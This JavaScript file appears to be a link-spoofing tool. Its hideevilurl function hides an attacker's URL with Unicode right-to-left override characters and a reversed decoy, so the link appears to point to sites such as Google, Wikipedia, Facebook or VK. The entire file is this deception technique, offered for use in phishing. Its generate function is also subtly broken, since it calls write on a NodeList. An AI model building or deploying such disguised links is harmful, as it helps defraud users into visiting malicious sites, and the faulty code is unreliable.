function hideevilurl(evilstring, goodstring) {
	var prefix = String.fromCharCode(8238) + " ";
	var between = "#!/?794473621=diu&4b412fd79ae1=q?/!#";
	var goodstring = esrever.reverse(goodstring);
	var suffix = " " + String.fromCharCode(8236);

	return prefix + evilstring + between + goodstring + suffix;
}

function findgoodurl(valuestring, otherstring) {
	if(valuestring == "wikipedia") {
		return "http://en.wikipedia.org/";
	}
	if(valuestring == "google") {
		return "http://google.com/";
	}
	if(valuestring == "nytimes") {
		return "http://nytimes.com/";
	}
	if(valuestring == "facebook") {
		return "http://facebook.com/";
	}
	if(valuestring == "youtube") {
		return "http://youtube.com/";
	}
	if(valuestring == "baidu") {
		return "http://baidu.com/";
	}
	if(valuestring == "qq") {
		return "http://qq.com/";
	}
	if(valuestring == "yandex") {
		return "http://yandex.ru/";
	}
	if(valuestring == "vkontakte") {
		return "http://vk.com/";
	}
	if(valuestring == "other") {
		return otherstring;
	}
}

function generate(form) {
	var result = document.querySelectorAll('#result');
	result.write(hideevilurl(form.evilstring.value, form.goodstring.value));
}
